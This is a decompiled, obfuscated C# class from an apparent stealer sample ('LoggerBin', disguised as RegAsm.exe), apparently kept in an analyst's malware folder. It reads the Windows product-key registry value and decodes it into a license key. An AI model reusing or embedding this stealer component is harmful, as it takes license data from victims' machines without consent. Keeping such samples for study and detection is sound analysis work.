// Decompiled with JetBrains decompiler
// Type: q5.Gf
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using IM;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Runtime.InteropServices;

namespace q5
{
  internal static class Gf
  {
    internal static Gf SH9;

    public static string i1()
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
      object obj = registryKey.OpenSubKey(w4.bx(4708, w4.vY))?.GetValue(w4.bx(4800, w4.vY));
      if (obj == null)
        return w4.bx(4836, w4.vY);
      byte[] numArray = (byte[]) obj;
      registryKey.Close();
      int num = Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2 || Environment.OSVersion.Version.Major > 6 ? 1 : 0;
      Gxs dxx = Gxs.Dxx;
      return Gxs.bx(numArray, (yc) num, dxx);
    }

    public static string j3(byte[] _param0, yc _param1) => _param1 != yc.Windows8AndUp ? IX.bx(_param0, IX.zxd) : IX.bx(_param0, IX.CxI);

    private static string An(byte[] _param0)
    {
      char[] chArray1 = new char[24]
      {
        'B',
        'C',
        'D',
        'F',
        'G',
        'H',
        'J',
        'K',
        'M',
        'P',
        'Q',
        'R',
        'T',
        'V',
        'W',
        'X',
        'Y',
        '2',
        '3',
        '4',
        '6',
        '7',
        '8',
        '9'
      };
      char[] chArray2 = new char[29];
      ArrayList arrayList = new ArrayList();
      for (int index = 52; index <= 67; ++index)
        arrayList.Add((object) _param0[index]);
      for (int index1 = 28; index1 >= 0; --index1)
      {
        if ((index1 + 1) % 6 == 0)
        {
          chArray2[index1] = '-';
          continue;
        }
        int index2 = 0;
        int index3 = 14;
        int num1 = 1;
        if (Gf.sHX() != null)
          goto label_10;
label_1:
        switch (num1)
        {
          case 1:
            if (index3 >= 0)
              goto default;
            else
              continue;
          default:
            int num2 = index2 << 8 | (int) (byte) arrayList[index3];
            arrayList[index3] = (object) (byte) (num2 / 24);
            index2 = num2 % 24;
            chArray2[index1] = chArray1[index2];
            --index3;
            goto case 1;
        }
label_10:
        int num3;
        num1 = num3;
        goto label_1;
      }
      return new string(chArray2);
    }

    public static string up(byte[] _param0)
    {
      string str1 = string.Empty;
      byte num1 = (byte) ((int) _param0[66] / 6 & 1);
      _param0[66] = (byte) ((int) _param0[66] & 247 | ((int) num1 & 2) * 4);
      int length = 0;
label_10:
      for (int index1 = 24; index1 >= 0; --index1)
      {
        int index2 = 0;
        int num2 = 14;
        while (true)
        {
          if (num2 >= 0)
            goto label_8;
          else
            goto label_7;
label_1:
          int num3;
          switch (num3)
          {
            case 1:
              length = index2;
              --num2;
              continue;
            default:
              goto label_10;
          }
label_7:
          str1 = w4.bx(4928, w4.vY)[index2].ToString() + str1;
          num3 = Gf.sHX() == null ? 0 : 0;
          goto label_1;
label_8:
          int num4 = index2 * 256;
          int num5 = (int) _param0[num2 + 52] + num4;
          _param0[num2 + 52] = (byte) (num5 / 24);
          index2 = num5 % 24;
          num3 = 1;
          if (!Gf.oHF())
          {
            num3 = 1;
            goto label_1;
          }
          else
            goto label_1;
        }
      }
      string str2 = str1.Substring(1, length);
      string str3 = str1.Substring(length + 1, str1.Length - (length + 1));
      string str4 = w4.bx(4980, w4.vY);
      string str5 = str3;
      string str6 = str2 + str4 + str5;
      for (int index = 5; index < Gf.fH7((object) str6); index += 6)
        str6 = (string) Gf.lHN((object) str6, index, (object) w4.bx(4986, w4.vY));
      return str6;
    }

    internal static bool oHF() => Gf.SH9 == null;

    internal static Gf sHX() => Gf.SH9;

    internal static object lHN([In] object obj0, [In] int obj1, [In] object obj2) => (object) ((string) obj0).Insert(obj1, (string) obj2);

    internal static int fH7([In] object obj0) => ((string) obj0).Length;
  }
}
